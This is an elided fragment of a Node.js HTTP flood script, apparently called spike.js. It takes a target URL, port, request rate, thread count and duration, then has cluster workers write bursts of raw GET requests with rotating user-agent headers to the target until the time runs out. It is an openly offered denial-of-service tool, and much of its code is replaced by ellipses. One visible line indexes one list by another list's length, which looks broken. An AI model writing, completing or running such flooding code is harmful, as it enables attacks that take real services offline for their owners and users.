...
if (process.argv.length <= 5) {
  console.log('node spike.js <url> <port> <rps> <threads> <time>');
  process.exit(-1);
}
...
try {
  ...
  console.error('Dstat Kuarang File ua.txt' + error);
  process.exit(-1);
}
...
if (cluster.isMaster) {
  ...
  console.log('\x1B[31mDSTAT SPIKE');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
    ...
    for (let i = 0; i < rps; i++) {
      ...
      socket.write(
        'GET ' +
          ...
          parsed.host +
          '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' +
          nullHexs[Math.floor(Math.random() * userAgents.length)] +
          '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
      );
    }
